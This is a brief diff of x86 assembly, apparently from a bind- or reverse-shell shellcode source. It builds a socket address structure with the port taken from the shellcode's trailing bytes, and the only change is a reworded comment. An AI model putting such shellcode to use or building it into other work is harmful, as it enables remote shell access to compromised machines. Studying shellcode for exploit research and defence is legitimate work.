@@ -135,7 +135,7 @@ port_in_esp:
 	push edx		; ANY HOST (0.0.0.0)}			||		struct in_addr sin_addr (unsigned long s_addr) };
 	;push DWORD 0x0100007f	; For 127.0.0.1 HOST
 	;push WORD 0xffaa	; PORT 43775 (reverse),			||	 	unsigned short sin_port,
-	push WORD [edi]		; PORT is specified in the bottom of the code / shellcode. Last two bytes in HEX.
+	push WORD [edi]		; PORT specified in the bottom of the code / shellcode. Last two bytes in HEX.
 
 	push WORD bx		; 2 - AF_INET				|| struct sockaddr { short sin_family,
 	mov ecx, esp		; Save PTR to sockaddr struct in ECX
